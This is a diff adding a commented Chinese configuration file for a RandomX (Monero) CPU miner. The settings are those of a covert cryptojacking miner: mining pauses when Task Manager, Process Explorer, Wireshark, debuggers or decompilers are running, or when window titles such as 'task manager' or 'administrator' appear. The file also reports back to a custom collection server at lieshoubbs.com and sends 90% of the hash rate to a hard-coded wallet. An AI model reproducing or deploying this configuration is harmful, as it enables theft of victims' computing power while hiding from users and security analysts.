@@ -1,0 +1,71 @@
+{
+  // ========== 基础设置 ==========
+  "dry-run": false,                    // 测试模式：true=只测试不挖矿，false=正常挖矿
+  "background": false,                  // 后台运行：true=后台运行，false=前台运行
+  
+  // ========== 上报设置（自定义功能） ==========
+  "report-host": "serveris.lieshoubbs.com",  // 上报服务器地址
+  "report-port": 8181,                       // 上报服务器端口
+  "report-path": "/cpu/api/collect.php",     // 上报API路径
+  "report-token": "",                        // 上报认证令牌（如需要）
+  
+  // ========== 日志设置 ==========
+  "autosave": true,                    // 自动保存配置：true=自动保存修改
+  "print-time": 60,                    // 打印统计间隔（秒）：每60秒显示一次挖矿速度
+  "log-file": "run.log",               // 日志文件路径
+  
+  // ========== CPU控制设置（自定义功能） ==========
+  "cpu-high-pause": 95,                // CPU高占用暂停阈值（%）：CPU使用率>=95%时暂停挖矿
+  "cpu-low-resume": 30,                // CPU低占用恢复阈值（%）：CPU使用率<=30%时可以恢复挖矿
+  "cpu-control-interval": 3,           // 统一检测间隔（秒）：每3秒检测一次CPU、进程和窗口
+  "cpu-resume-delay": 30,              // 恢复延迟（秒）：所有条件满足后等待30秒再恢复挖矿
+  
+  // ========== 进程检测设置（自定义功能） ==========
+  // 检测到以下任何进程运行时暂停挖矿
+  // 特性：不区分大小写（taskmgr.exe = Taskmgr.exe = TASKMGR.EXE）
+  // 检测间隔：使用 cpu-control-interval 的值（3秒）
+  "process-pause-names": "taskmgr.exe,processhacker.exe,procexp.exe,procexp64.exe,processexplorer.exe,processmonitor.exe,procmon.exe,filemon.exe,regmon.exe,wireshark.exe,fiddler.exe,charles.exe,burpsuite.exe,ollydbg.exe,x64dbg.exe,ida.exe,ida64.exe,ghidra.exe,radare2.exe,windbg.exe,immunity.exe,dnspy.exe,de4dot.exe,ilspy.exe,dotpeek.exe,reflector.exe,cheatengine.exe,artmoney.exe,gamehack.exe,hacktool.exe,keylogger.exe,spyware.exe,malware.exe,virus.exe,trojan.exe,backdoor.exe,rootkit.exe,exploit.exe,payload.exe,injector.exe,packer.exe,unpacker.exe,protector.exe,obfuscator.exe,deobfuscator.exe,analyzer.exe,scanner.exe,monitor.exe,logger.exe,tracker.exe,spy.exe,stealer.exe,miner.exe,coinminer.exe,cryptominer.exe",
+  
+  // ========== 窗口检测设置（自定义功能） ==========
+  // 检测到包含以下任何关键词的窗口标题时暂停挖矿
+  // 特性：模糊匹配（例如：配置"administrator"会匹配"123-administrator-test"）
+  // 特性：不区分大小写（Administrator = administrator = ADMINISTRATOR）
+  // 检测间隔：使用 cpu-control-interval 的值（3秒）
+  // 优化：只有在进程未检测到时才检测窗口（提高性能）
+  "window-pause-names": "administrator,任务管理器,task manager,process explorer,process hacker,wireshark,fiddler,cheat engine,ida pro,x64dbg,ollydbg",
+  
+  // ========== 捐赠设置 ==========
+  "donate-level": 90,                  // 捐赠比例（%）：90%的算力捐赠给开发者
+  "donate-address": "4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGmNuJ2GRcq1Uh361z.323",  // 捐赠钱包地址
+  "donate-use-user-pool": true,        // 使用用户矿池进行捐赠
+  
+  // ========== CPU挖矿设置 ==========
+  "cpu": {
+    "enabled": true,                   // 启用CPU挖矿
+    "max-threads-hint": 70,            // 最大线程使用率（%）：使用70%的CPU线程
+    "yield": true                      // 线程让步：true=对其他程序友好
+  },
+  
+  // ========== GPU挖矿设置 ==========
+  "opencl": { "enabled": false },      // OpenCL（AMD显卡）：禁用
+  "cuda": { "enabled": false },        // CUDA（NVIDIA显卡）：禁用
+  
+  // ========== RandomX算法设置 ==========
+  "randomx": { 
+    "1gb-pages": false,                // 1GB大页：false=不使用（需要管理员权限）
+    "wrmsr": true,                     // MSR寄存器写入：true=尝试优化性能
+    "rdmsr": true                      // MSR寄存器读取：true=尝试优化性能
+  },
+  
+  // ========== 矿池设置 ==========
+  "pools": [
+    {
+      "url": "miner.ntminer.vip:10799",     // 矿池地址和端口
+      "user": "4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGmNuJ2GRcq1Uh361z.44444",  // 钱包地址.矿工名
+      "pass": "x",                          // 密码（大多数矿池用x即可）
+      "algo": "rx/0",                       // 算法：RandomX
+      "keepalive": true,                    // 保持连接
+      "tls": true                           // 启用SSL/TLS加密连接
+    }
+  ]
+}
